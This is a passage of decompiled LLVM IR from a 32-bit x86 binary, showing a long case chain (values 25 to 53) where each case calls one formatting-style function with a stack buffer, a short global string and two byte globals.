  %v0_804a5c9 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a5c9 = zext i8 %v0_804a5c9 to i32
  %v2_804a5d8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5d8, i32* @ebx, align 4
  %v5_804a5ea = call i32 @function_8048c55(i32 %v2_804a5d8, i32 ptrtoint ([11 x i8]* @global_var_805ab1e.67 to i32), i32 %v1_804a5c9, i32 %v1_804a5bf)
  br label %dec_label_pc_804a5ef

dec_label_pc_804a5ef:                             ; preds = %dec_label_pc_804a5b9, %dec_label_pc_804a5bf
  %v13_804a5ef = icmp eq i32 %v2_804a0a2, 25
  %v1_804a5f3 = icmp eq i1 %v13_804a5ef, false
  br i1 %v1_804a5f3, label %dec_label_pc_804a625, label %dec_label_pc_804a5f5

dec_label_pc_804a5f5:                             ; preds = %dec_label_pc_804a5ef
  %v0_804a5f5 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a5f5 = zext i8 %v0_804a5f5 to i32
  store i32 %v1_804a5f5, i32* @edx, align 4
  %v0_804a5ff = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a5ff = zext i8 %v0_804a5ff to i32
  %v2_804a60e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a60e, i32* @ebx, align 4
  %v5_804a620 = call i32 @function_8048c55(i32 %v2_804a60e, i32 ptrtoint ([11 x i8]* @global_var_805ab29.68 to i32), i32 %v1_804a5ff, i32 %v1_804a5f5)
  br label %dec_label_pc_804a625

dec_label_pc_804a625:                             ; preds = %dec_label_pc_804a5ef, %dec_label_pc_804a5f5
  %v13_804a625 = icmp eq i32 %v2_804a0a2, 26
  %v1_804a629 = icmp eq i1 %v13_804a625, false
  br i1 %v1_804a629, label %dec_label_pc_804a65b, label %dec_label_pc_804a62b

dec_label_pc_804a62b:                             ; preds = %dec_label_pc_804a625
  %v0_804a62b = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a62b = zext i8 %v0_804a62b to i32
  store i32 %v1_804a62b, i32* @edx, align 4
  %v0_804a635 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a635 = zext i8 %v0_804a635 to i32
  %v2_804a644 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a644, i32* @ebx, align 4
  %v5_804a656 = call i32 @function_8048c55(i32 %v2_804a644, i32 ptrtoint ([12 x i8]* @global_var_805ab34.69 to i32), i32 %v1_804a635, i32 %v1_804a62b)
  br label %dec_label_pc_804a65b

dec_label_pc_804a65b:                             ; preds = %dec_label_pc_804a625, %dec_label_pc_804a62b
  %v13_804a65b = icmp eq i32 %v2_804a0a2, 27
  %v1_804a65f = icmp eq i1 %v13_804a65b, false
  br i1 %v1_804a65f, label %dec_label_pc_804a691, label %dec_label_pc_804a661

dec_label_pc_804a661:                             ; preds = %dec_label_pc_804a65b
  %v0_804a661 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a661 = zext i8 %v0_804a661 to i32
  store i32 %v1_804a661, i32* @edx, align 4
  %v0_804a66b = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a66b = zext i8 %v0_804a66b to i32
  %v2_804a67a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a67a, i32* @ebx, align 4
  %v5_804a68c = call i32 @function_8048c55(i32 %v2_804a67a, i32 ptrtoint ([12 x i8]* @global_var_805ab40.70 to i32), i32 %v1_804a66b, i32 %v1_804a661)
  br label %dec_label_pc_804a691

dec_label_pc_804a691:                             ; preds = %dec_label_pc_804a65b, %dec_label_pc_804a661
  %v13_804a691 = icmp eq i32 %v2_804a0a2, 28
  %v1_804a695 = icmp eq i1 %v13_804a691, false
  br i1 %v1_804a695, label %dec_label_pc_804a6c7, label %dec_label_pc_804a697

dec_label_pc_804a697:                             ; preds = %dec_label_pc_804a691
  %v0_804a697 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a697 = zext i8 %v0_804a697 to i32
  store i32 %v1_804a697, i32* @edx, align 4
  %v0_804a6a1 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a6a1 = zext i8 %v0_804a6a1 to i32
  %v2_804a6b0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6b0, i32* @ebx, align 4
  %v5_804a6c2 = call i32 @function_8048c55(i32 %v2_804a6b0, i32 ptrtoint ([12 x i8]* @global_var_805ab4c.71 to i32), i32 %v1_804a6a1, i32 %v1_804a697)
  br label %dec_label_pc_804a6c7

dec_label_pc_804a6c7:                             ; preds = %dec_label_pc_804a691, %dec_label_pc_804a697
  %v13_804a6c7 = icmp eq i32 %v2_804a0a2, 29
  %v1_804a6cb = icmp eq i1 %v13_804a6c7, false
  br i1 %v1_804a6cb, label %dec_label_pc_804a6fd, label %dec_label_pc_804a6cd

dec_label_pc_804a6cd:                             ; preds = %dec_label_pc_804a6c7
  %v0_804a6cd = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a6cd = zext i8 %v0_804a6cd to i32
  store i32 %v1_804a6cd, i32* @edx, align 4
  %v0_804a6d7 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a6d7 = zext i8 %v0_804a6d7 to i32
  %v2_804a6e6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6e6, i32* @ebx, align 4
  %v5_804a6f8 = call i32 @function_8048c55(i32 %v2_804a6e6, i32 ptrtoint ([13 x i8]* @global_var_805ab58.72 to i32), i32 %v1_804a6d7, i32 %v1_804a6cd)
  br label %dec_label_pc_804a6fd

dec_label_pc_804a6fd:                             ; preds = %dec_label_pc_804a6c7, %dec_label_pc_804a6cd
  %v13_804a6fd = icmp eq i32 %v2_804a0a2, 30
  %v1_804a701 = icmp eq i1 %v13_804a6fd, false
  br i1 %v1_804a701, label %dec_label_pc_804a733, label %dec_label_pc_804a703

dec_label_pc_804a703:                             ; preds = %dec_label_pc_804a6fd
  %v0_804a703 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a703 = zext i8 %v0_804a703 to i32
  store i32 %v1_804a703, i32* @edx, align 4
  %v0_804a70d = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a70d = zext i8 %v0_804a70d to i32
  %v2_804a71c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a71c, i32* @ebx, align 4
  %v5_804a72e = call i32 @function_8048c55(i32 %v2_804a71c, i32 ptrtoint ([13 x i8]* @global_var_805ab65.73 to i32), i32 %v1_804a70d, i32 %v1_804a703)
  br label %dec_label_pc_804a733

dec_label_pc_804a733:                             ; preds = %dec_label_pc_804a6fd, %dec_label_pc_804a703
  %v13_804a733 = icmp eq i32 %v2_804a0a2, 31
  %v1_804a737 = icmp eq i1 %v13_804a733, false
  br i1 %v1_804a737, label %dec_label_pc_804a769, label %dec_label_pc_804a739

dec_label_pc_804a739:                             ; preds = %dec_label_pc_804a733
  %v0_804a739 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a739 = zext i8 %v0_804a739 to i32
  store i32 %v1_804a739, i32* @edx, align 4
  %v0_804a743 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a743 = zext i8 %v0_804a743 to i32
  %v2_804a752 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a752, i32* @ebx, align 4
  %v5_804a764 = call i32 @function_8048c55(i32 %v2_804a752, i32 ptrtoint ([14 x i8]* @global_var_805ab72.74 to i32), i32 %v1_804a743, i32 %v1_804a739)
  br label %dec_label_pc_804a769

dec_label_pc_804a769:                             ; preds = %dec_label_pc_804a733, %dec_label_pc_804a739
  %v10_804a769 = icmp eq i32 %v2_804a0a2, 32
  %v1_804a76d = icmp eq i1 %v10_804a769, false
  br i1 %v1_804a76d, label %dec_label_pc_804a79f, label %dec_label_pc_804a76f

dec_label_pc_804a76f:                             ; preds = %dec_label_pc_804a769
  %v0_804a76f = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a76f = zext i8 %v0_804a76f to i32
  store i32 %v1_804a76f, i32* @edx, align 4
  %v0_804a779 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a779 = zext i8 %v0_804a779 to i32
  %v2_804a788 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a788, i32* @ebx, align 4
  %v5_804a79a = call i32 @function_8048c55(i32 %v2_804a788, i32 ptrtoint ([14 x i8]* @global_var_805ab80.75 to i32), i32 %v1_804a779, i32 %v1_804a76f)
  br label %dec_label_pc_804a79f

dec_label_pc_804a79f:                             ; preds = %dec_label_pc_804a769, %dec_label_pc_804a76f
  %v13_804a79f = icmp eq i32 %v2_804a0a2, 33
  %v1_804a7a3 = icmp eq i1 %v13_804a79f, false
  br i1 %v1_804a7a3, label %dec_label_pc_804a7d5, label %dec_label_pc_804a7a5

dec_label_pc_804a7a5:                             ; preds = %dec_label_pc_804a79f
  %v0_804a7a5 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a7a5 = zext i8 %v0_804a7a5 to i32
  store i32 %v1_804a7a5, i32* @edx, align 4
  %v0_804a7af = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a7af = zext i8 %v0_804a7af to i32
  %v2_804a7be = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7be, i32* @ebx, align 4
  %v5_804a7d0 = call i32 @function_8048c55(i32 %v2_804a7be, i32 ptrtoint ([13 x i8]* @global_var_805ab8e.76 to i32), i32 %v1_804a7af, i32 %v1_804a7a5)
  br label %dec_label_pc_804a7d5

dec_label_pc_804a7d5:                             ; preds = %dec_label_pc_804a79f, %dec_label_pc_804a7a5
  %v13_804a7d5 = icmp eq i32 %v2_804a0a2, 34
  %v1_804a7d9 = icmp eq i1 %v13_804a7d5, false
  br i1 %v1_804a7d9, label %dec_label_pc_804a80b, label %dec_label_pc_804a7db

dec_label_pc_804a7db:                             ; preds = %dec_label_pc_804a7d5
  %v0_804a7db = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a7db = zext i8 %v0_804a7db to i32
  store i32 %v1_804a7db, i32* @edx, align 4
  %v0_804a7e5 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a7e5 = zext i8 %v0_804a7e5 to i32
  %v2_804a7f4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7f4, i32* @ebx, align 4
  %v5_804a806 = call i32 @function_8048c55(i32 %v2_804a7f4, i32 ptrtoint ([13 x i8]* @global_var_805ab9b.77 to i32), i32 %v1_804a7e5, i32 %v1_804a7db)
  br label %dec_label_pc_804a80b

dec_label_pc_804a80b:                             ; preds = %dec_label_pc_804a7d5, %dec_label_pc_804a7db
  %v13_804a80b = icmp eq i32 %v2_804a0a2, 35
  %v1_804a80f = icmp eq i1 %v13_804a80b, false
  br i1 %v1_804a80f, label %dec_label_pc_804a841, label %dec_label_pc_804a811

dec_label_pc_804a811:                             ; preds = %dec_label_pc_804a80b
  %v0_804a811 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a811 = zext i8 %v0_804a811 to i32
  store i32 %v1_804a811, i32* @edx, align 4
  %v0_804a81b = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a81b = zext i8 %v0_804a81b to i32
  %v2_804a82a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a82a, i32* @ebx, align 4
  %v5_804a83c = call i32 @function_8048c55(i32 %v2_804a82a, i32 ptrtoint ([13 x i8]* @global_var_805aba8.78 to i32), i32 %v1_804a81b, i32 %v1_804a811)
  br label %dec_label_pc_804a841

dec_label_pc_804a841:                             ; preds = %dec_label_pc_804a80b, %dec_label_pc_804a811
  %v13_804a841 = icmp eq i32 %v2_804a0a2, 36
  %v1_804a845 = icmp eq i1 %v13_804a841, false
  br i1 %v1_804a845, label %dec_label_pc_804a877, label %dec_label_pc_804a847

dec_label_pc_804a847:                             ; preds = %dec_label_pc_804a841
  %v0_804a847 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a847 = zext i8 %v0_804a847 to i32
  store i32 %v1_804a847, i32* @edx, align 4
  %v0_804a851 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a851 = zext i8 %v0_804a851 to i32
  %v2_804a860 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a860, i32* @ebx, align 4
  %v5_804a872 = call i32 @function_8048c55(i32 %v2_804a860, i32 ptrtoint ([13 x i8]* @global_var_805abb5.79 to i32), i32 %v1_804a851, i32 %v1_804a847)
  br label %dec_label_pc_804a877

dec_label_pc_804a877:                             ; preds = %dec_label_pc_804a841, %dec_label_pc_804a847
  %v13_804a877 = icmp eq i32 %v2_804a0a2, 37
  %v1_804a87b = icmp eq i1 %v13_804a877, false
  br i1 %v1_804a87b, label %dec_label_pc_804a8ad, label %dec_label_pc_804a87d

dec_label_pc_804a87d:                             ; preds = %dec_label_pc_804a877
  %v0_804a87d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a87d = zext i8 %v0_804a87d to i32
  store i32 %v1_804a87d, i32* @edx, align 4
  %v0_804a887 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a887 = zext i8 %v0_804a887 to i32
  %v2_804a896 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a896, i32* @ebx, align 4
  %v5_804a8a8 = call i32 @function_8048c55(i32 %v2_804a896, i32 ptrtoint ([13 x i8]* @global_var_805abc2.80 to i32), i32 %v1_804a887, i32 %v1_804a87d)
  br label %dec_label_pc_804a8ad

dec_label_pc_804a8ad:                             ; preds = %dec_label_pc_804a877, %dec_label_pc_804a87d
  %v13_804a8ad = icmp eq i32 %v2_804a0a2, 38
  %v1_804a8b1 = icmp eq i1 %v13_804a8ad, false
  br i1 %v1_804a8b1, label %dec_label_pc_804a8e3, label %dec_label_pc_804a8b3

dec_label_pc_804a8b3:                             ; preds = %dec_label_pc_804a8ad
  %v0_804a8b3 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a8b3 = zext i8 %v0_804a8b3 to i32
  store i32 %v1_804a8b3, i32* @edx, align 4
  %v0_804a8bd = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a8bd = zext i8 %v0_804a8bd to i32
  %v2_804a8cc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8cc, i32* @ebx, align 4
  %v5_804a8de = call i32 @function_8048c55(i32 %v2_804a8cc, i32 ptrtoint ([13 x i8]* @global_var_805abcf.81 to i32), i32 %v1_804a8bd, i32 %v1_804a8b3)
  br label %dec_label_pc_804a8e3

dec_label_pc_804a8e3:                             ; preds = %dec_label_pc_804a8ad, %dec_label_pc_804a8b3
  %v13_804a8e3 = icmp eq i32 %v2_804a0a2, 39
  %v1_804a8e7 = icmp eq i1 %v13_804a8e3, false
  br i1 %v1_804a8e7, label %dec_label_pc_804a919, label %dec_label_pc_804a8e9

dec_label_pc_804a8e9:                             ; preds = %dec_label_pc_804a8e3
  %v0_804a8e9 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a8e9 = zext i8 %v0_804a8e9 to i32
  store i32 %v1_804a8e9, i32* @edx, align 4
  %v0_804a8f3 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a8f3 = zext i8 %v0_804a8f3 to i32
  %v2_804a902 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a902, i32* @ebx, align 4
  %v5_804a914 = call i32 @function_8048c55(i32 %v2_804a902, i32 ptrtoint ([13 x i8]* @global_var_805abdc.82 to i32), i32 %v1_804a8f3, i32 %v1_804a8e9)
  br label %dec_label_pc_804a919

dec_label_pc_804a919:                             ; preds = %dec_label_pc_804a8e3, %dec_label_pc_804a8e9
  %v13_804a919 = icmp eq i32 %v2_804a0a2, 40
  %v1_804a91d = icmp eq i1 %v13_804a919, false
  br i1 %v1_804a91d, label %dec_label_pc_804a94f, label %dec_label_pc_804a91f

dec_label_pc_804a91f:                             ; preds = %dec_label_pc_804a919
  %v0_804a91f = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a91f = zext i8 %v0_804a91f to i32
  store i32 %v1_804a91f, i32* @edx, align 4
  %v0_804a929 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a929 = zext i8 %v0_804a929 to i32
  %v2_804a938 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a938, i32* @ebx, align 4
  %v5_804a94a = call i32 @function_8048c55(i32 %v2_804a938, i32 ptrtoint ([14 x i8]* @global_var_805abe9.83 to i32), i32 %v1_804a929, i32 %v1_804a91f)
  br label %dec_label_pc_804a94f

dec_label_pc_804a94f:                             ; preds = %dec_label_pc_804a919, %dec_label_pc_804a91f
  %v13_804a94f = icmp eq i32 %v2_804a0a2, 41
  %v1_804a953 = icmp eq i1 %v13_804a94f, false
  br i1 %v1_804a953, label %dec_label_pc_804a985, label %dec_label_pc_804a955

dec_label_pc_804a955:                             ; preds = %dec_label_pc_804a94f
  %v0_804a955 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a955 = zext i8 %v0_804a955 to i32
  store i32 %v1_804a955, i32* @edx, align 4
  %v0_804a95f = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a95f = zext i8 %v0_804a95f to i32
  %v2_804a96e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a96e, i32* @ebx, align 4
  %v5_804a980 = call i32 @function_8048c55(i32 %v2_804a96e, i32 ptrtoint ([13 x i8]* @global_var_805abf7.84 to i32), i32 %v1_804a95f, i32 %v1_804a955)
  br label %dec_label_pc_804a985

dec_label_pc_804a985:                             ; preds = %dec_label_pc_804a94f, %dec_label_pc_804a955
  %v13_804a985 = icmp eq i32 %v2_804a0a2, 42
  %v1_804a989 = icmp eq i1 %v13_804a985, false
  br i1 %v1_804a989, label %dec_label_pc_804a9bb, label %dec_label_pc_804a98b

dec_label_pc_804a98b:                             ; preds = %dec_label_pc_804a985
  %v0_804a98b = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a98b = zext i8 %v0_804a98b to i32
  store i32 %v1_804a98b, i32* @edx, align 4
  %v0_804a995 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a995 = zext i8 %v0_804a995 to i32
  %v2_804a9a4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9a4, i32* @ebx, align 4
  %v5_804a9b6 = call i32 @function_8048c55(i32 %v2_804a9a4, i32 ptrtoint ([13 x i8]* @global_var_805ac04.85 to i32), i32 %v1_804a995, i32 %v1_804a98b)
  br label %dec_label_pc_804a9bb

dec_label_pc_804a9bb:                             ; preds = %dec_label_pc_804a985, %dec_label_pc_804a98b
  %v13_804a9bb = icmp eq i32 %v2_804a0a2, 43
  %v1_804a9bf = icmp eq i1 %v13_804a9bb, false
  br i1 %v1_804a9bf, label %dec_label_pc_804a9f1, label %dec_label_pc_804a9c1

dec_label_pc_804a9c1:                             ; preds = %dec_label_pc_804a9bb
  %v0_804a9c1 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a9c1 = zext i8 %v0_804a9c1 to i32
  store i32 %v1_804a9c1, i32* @edx, align 4
  %v0_804a9cb = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804a9cb = zext i8 %v0_804a9cb to i32
  %v2_804a9da = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9da, i32* @ebx, align 4
  %v5_804a9ec = call i32 @function_8048c55(i32 %v2_804a9da, i32 ptrtoint ([13 x i8]* @global_var_805ac11.86 to i32), i32 %v1_804a9cb, i32 %v1_804a9c1)
  br label %dec_label_pc_804a9f1

dec_label_pc_804a9f1:                             ; preds = %dec_label_pc_804a9bb, %dec_label_pc_804a9c1
  %v13_804a9f1 = icmp eq i32 %v2_804a0a2, 44
  %v1_804a9f5 = icmp eq i1 %v13_804a9f1, false
  br i1 %v1_804a9f5, label %dec_label_pc_804aa27, label %dec_label_pc_804a9f7

dec_label_pc_804a9f7:                             ; preds = %dec_label_pc_804a9f1
  %v0_804a9f7 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804a9f7 = zext i8 %v0_804a9f7 to i32
  store i32 %v1_804a9f7, i32* @edx, align 4
  %v0_804aa01 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804aa01 = zext i8 %v0_804aa01 to i32
  %v2_804aa10 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa10, i32* @ebx, align 4
  %v5_804aa22 = call i32 @function_8048c55(i32 %v2_804aa10, i32 ptrtoint ([13 x i8]* @global_var_805ac1e.87 to i32), i32 %v1_804aa01, i32 %v1_804a9f7)
  br label %dec_label_pc_804aa27

dec_label_pc_804aa27:                             ; preds = %dec_label_pc_804a9f1, %dec_label_pc_804a9f7
  %v13_804aa27 = icmp eq i32 %v2_804a0a2, 45
  %v1_804aa2b = icmp eq i1 %v13_804aa27, false
  br i1 %v1_804aa2b, label %dec_label_pc_804aa5d, label %dec_label_pc_804aa2d

dec_label_pc_804aa2d:                             ; preds = %dec_label_pc_804aa27
  %v0_804aa2d = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804aa2d = zext i8 %v0_804aa2d to i32
  store i32 %v1_804aa2d, i32* @edx, align 4
  %v0_804aa37 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804aa37 = zext i8 %v0_804aa37 to i32
  %v2_804aa46 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa46, i32* @ebx, align 4
  %v5_804aa58 = call i32 @function_8048c55(i32 %v2_804aa46, i32 ptrtoint ([13 x i8]* @global_var_805ac2b.88 to i32), i32 %v1_804aa37, i32 %v1_804aa2d)
  br label %dec_label_pc_804aa5d

dec_label_pc_804aa5d:                             ; preds = %dec_label_pc_804aa27, %dec_label_pc_804aa2d
  %v13_804aa5d = icmp eq i32 %v2_804a0a2, 46
  %v1_804aa61 = icmp eq i1 %v13_804aa5d, false
  br i1 %v1_804aa61, label %dec_label_pc_804aa93, label %dec_label_pc_804aa63

dec_label_pc_804aa63:                             ; preds = %dec_label_pc_804aa5d
  %v0_804aa63 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804aa63 = zext i8 %v0_804aa63 to i32
  store i32 %v1_804aa63, i32* @edx, align 4
  %v0_804aa6d = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804aa6d = zext i8 %v0_804aa6d to i32
  %v2_804aa7c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa7c, i32* @ebx, align 4
  %v5_804aa8e = call i32 @function_8048c55(i32 %v2_804aa7c, i32 ptrtoint ([13 x i8]* @global_var_805ac38.89 to i32), i32 %v1_804aa6d, i32 %v1_804aa63)
  br label %dec_label_pc_804aa93

dec_label_pc_804aa93:                             ; preds = %dec_label_pc_804aa5d, %dec_label_pc_804aa63
  %v13_804aa93 = icmp eq i32 %v2_804a0a2, 47
  %v1_804aa97 = icmp eq i1 %v13_804aa93, false
  br i1 %v1_804aa97, label %dec_label_pc_804aac9, label %dec_label_pc_804aa99

dec_label_pc_804aa99:                             ; preds = %dec_label_pc_804aa93
  %v0_804aa99 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804aa99 = zext i8 %v0_804aa99 to i32
  store i32 %v1_804aa99, i32* @edx, align 4
  %v0_804aaa3 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804aaa3 = zext i8 %v0_804aaa3 to i32
  %v2_804aab2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aab2, i32* @ebx, align 4
  %v5_804aac4 = call i32 @function_8048c55(i32 %v2_804aab2, i32 ptrtoint ([14 x i8]* @global_var_805ac45.90 to i32), i32 %v1_804aaa3, i32 %v1_804aa99)
  br label %dec_label_pc_804aac9

dec_label_pc_804aac9:                             ; preds = %dec_label_pc_804aa93, %dec_label_pc_804aa99
  %v10_804aac9 = icmp eq i32 %v2_804a0a2, 48
  %v1_804aacd = icmp eq i1 %v10_804aac9, false
  br i1 %v1_804aacd, label %dec_label_pc_804aaff, label %dec_label_pc_804aacf

dec_label_pc_804aacf:                             ; preds = %dec_label_pc_804aac9
  %v0_804aacf = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804aacf = zext i8 %v0_804aacf to i32
  store i32 %v1_804aacf, i32* @edx, align 4
  %v0_804aad9 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804aad9 = zext i8 %v0_804aad9 to i32
  %v2_804aae8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aae8, i32* @ebx, align 4
  %v5_804aafa = call i32 @function_8048c55(i32 %v2_804aae8, i32 ptrtoint ([13 x i8]* @global_var_805ac53.91 to i32), i32 %v1_804aad9, i32 %v1_804aacf)
  br label %dec_label_pc_804aaff

dec_label_pc_804aaff:                             ; preds = %dec_label_pc_804aac9, %dec_label_pc_804aacf
  %v13_804aaff = icmp eq i32 %v2_804a0a2, 49
  %v1_804ab03 = icmp eq i1 %v13_804aaff, false
  br i1 %v1_804ab03, label %dec_label_pc_804ab35, label %dec_label_pc_804ab05

dec_label_pc_804ab05:                             ; preds = %dec_label_pc_804aaff
  %v0_804ab05 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ab05 = zext i8 %v0_804ab05 to i32
  store i32 %v1_804ab05, i32* @edx, align 4
  %v0_804ab0f = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ab0f = zext i8 %v0_804ab0f to i32
  %v2_804ab1e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab1e, i32* @ebx, align 4
  %v5_804ab30 = call i32 @function_8048c55(i32 %v2_804ab1e, i32 ptrtoint ([14 x i8]* @global_var_805ac60.92 to i32), i32 %v1_804ab0f, i32 %v1_804ab05)
  br label %dec_label_pc_804ab35

dec_label_pc_804ab35:                             ; preds = %dec_label_pc_804aaff, %dec_label_pc_804ab05
  %v13_804ab35 = icmp eq i32 %v2_804a0a2, 50
  %v1_804ab39 = icmp eq i1 %v13_804ab35, false
  br i1 %v1_804ab39, label %dec_label_pc_804ab6b, label %dec_label_pc_804ab3b

dec_label_pc_804ab3b:                             ; preds = %dec_label_pc_804ab35
  %v0_804ab3b = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ab3b = zext i8 %v0_804ab3b to i32
  store i32 %v1_804ab3b, i32* @edx, align 4
  %v0_804ab45 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ab45 = zext i8 %v0_804ab45 to i32
  %v2_804ab54 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab54, i32* @ebx, align 4
  %v5_804ab66 = call i32 @function_8048c55(i32 %v2_804ab54, i32 ptrtoint ([14 x i8]* @global_var_805ac6e.93 to i32), i32 %v1_804ab45, i32 %v1_804ab3b)
  br label %dec_label_pc_804ab6b

dec_label_pc_804ab6b:                             ; preds = %dec_label_pc_804ab35, %dec_label_pc_804ab3b
  %v13_804ab6b = icmp eq i32 %v2_804a0a2, 51
  %v1_804ab6f = icmp eq i1 %v13_804ab6b, false
  br i1 %v1_804ab6f, label %dec_label_pc_804aba1, label %dec_label_pc_804ab71

dec_label_pc_804ab71:                             ; preds = %dec_label_pc_804ab6b
  %v0_804ab71 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804ab71 = zext i8 %v0_804ab71 to i32
  store i32 %v1_804ab71, i32* @edx, align 4
  %v0_804ab7b = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804ab7b = zext i8 %v0_804ab7b to i32
  %v2_804ab8a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab8a, i32* @ebx, align 4
  %v5_804ab9c = call i32 @function_8048c55(i32 %v2_804ab8a, i32 ptrtoint ([14 x i8]* @global_var_805ac7c.94 to i32), i32 %v1_804ab7b, i32 %v1_804ab71)
  br label %dec_label_pc_804aba1

dec_label_pc_804aba1:                             ; preds = %dec_label_pc_804ab6b, %dec_label_pc_804ab71
  %v13_804aba1 = icmp eq i32 %v2_804a0a2, 52
  %v1_804aba5 = icmp eq i1 %v13_804aba1, false
  br i1 %v1_804aba5, label %dec_label_pc_804abd7, label %dec_label_pc_804aba7

dec_label_pc_804aba7:                             ; preds = %dec_label_pc_804aba1
  %v0_804aba7 = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804aba7 = zext i8 %v0_804aba7 to i32
  store i32 %v1_804aba7, i32* @edx, align 4
  %v0_804abb1 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804abb1 = zext i8 %v0_804abb1 to i32
  %v2_804abc0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abc0, i32* @ebx, align 4
  %v5_804abd2 = call i32 @function_8048c55(i32 %v2_804abc0, i32 ptrtoint ([14 x i8]* @global_var_805ac8a.95 to i32), i32 %v1_804abb1, i32 %v1_804aba7)
  br label %dec_label_pc_804abd7

dec_label_pc_804abd7:                             ; preds = %dec_label_pc_804aba1, %dec_label_pc_804aba7
  %v13_804abd7 = icmp eq i32 %v2_804a0a2, 53
  %v1_804abdb = icmp eq i1 %v13_804abd7, false
  br i1 %v1_804abdb, label %dec_label_pc_804ac0d, label %dec_label_pc_804abdd

dec_label_pc_804abdd:                             ; preds = %dec_label_pc_804abd7
  %v0_804abdd = load i8, i8* @global_var_805e8da.42, align 2
  %v1_804abdd = zext i8 %v0_804abdd to i32
  store i32 %v1_804abdd, i32* @edx, align 4
  %v0_804abe7 = load i8, i8* @global_var_805e8d9.41, align 1
  %v1_804abe7 = zext i8 %v0_804abe7 to i32
  %v2_804abf6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abf6, i32* @ebx, align 4
  %v5_804ac08 = call i32 @function_8048c55(i32 %v2_804abf6, i32 ptrtoint ([13 x i8]* @global_var_805ac98.96 to i32), i32 %v1_804abe7, i32 %v1_804abdd)
  br label %dec_label_pc_804ac0d

